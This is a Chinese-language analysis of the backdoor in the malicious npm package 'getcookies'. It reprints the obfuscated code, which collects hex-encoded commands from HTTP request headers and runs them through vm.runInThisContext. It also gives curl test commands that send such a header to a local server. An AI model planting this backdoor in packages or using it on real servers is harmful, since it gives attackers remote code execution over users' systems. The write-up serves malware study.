## getcookies

## 后面代码分析

```js
// 分配一块 64K 的内存
module.exports.log = module.exports.log || Buffer.alloc(0xffff);

// gCOMMANDhDATAi
JSON.stringify(req.headers).replace(/g([a-f0-9]{4})h((?:[a-f0-9]{2})+)i/gi, (o, p, v) => {
    // 以 0xfffe 命令为样例
    // 将字符串 feff 读入 Buffer
    // 'feff' => <Buffer fe ff>
    // readUInt16LE 读取 16 bit(位) 并以 byte(字节) 反向排序
    // <Buffer fe ff> => 0xfffe
    //
    // > Buffer.from('feff', 'hex').readUInt16LE(0) === 0xfffe
    // true
    // > Buffer.from('1234567890', 'hex').readUInt32LE(1).toString(16)
    // '90785634'
    p = Buffer.from(p, 'hex').readUInt16LE(0);
    switch (p) {

        case 0xfffe:
            module.exports.log = Buffer.alloc(0xffff);
            return;
        case 0xfffa:
            return setTimeout(() => {

                // 去除末尾的 0x00
                let c = module.exports.log.toString().replace(/\x00*$/, '');
                module.exports.log = Buffer.alloc(0xffff);

                // 不能以 0x00 开头
                if (c.indexOf('\x00') < 0) {
                    // require('vm')['runInThisContext'](c)(module.exports, require, req, res, next)
                    // 代码必须是个函数
                    require('\x76\x6d')['\x72\x75\x6e\x49\x6e\x54\x68\x69\x73\x43\x6f\x6e\x74\x65\x78\x74'](c)(module.exports, require, req, res, next);
                }
                next();
            }, 1000);
        default:
            // 我们以 (function(){console.log('hack')}) 为例
            v = Buffer.from(v, 'hex');
            for (let i = 0; i < v.length; i++) {

                // 因为执行命令的时候，不能以 0x00 开头
                // 所以，p 必须是 0x0000
                module.exports.log[p + i] = v[i];
            }
    }
});
```

## Test

```sh
$ node demo/index.js
$ curl -H 'evil: g0000h2866756e6374696f6e28297b636f6e736f6c652e6c6f6728276861636b27297d29i'  http://127.0.0.1:3000
$ curl -H 'evil: gfaffh00i'  http://127.0.0.1:3000
```

## References
* [文件来源](https://npm.runkit.com/getcookies/test/harness.js?t=1525249320108)
* [讨论地址](https://news.ycombinator.com/item?id=16975025)
* [细思极恐：后门代码被隐藏在npm模块中，差点就得逞](https://mp.weixin.qq.com/s/4JGuRDR54OnJyAqlSns53Q)
* [npm blog](https://blog.npmjs.org/post/173526807575/reported-malicious-module-getcookies)
* [16进制转换](https://www.bejson.com/convert/ox2str/)
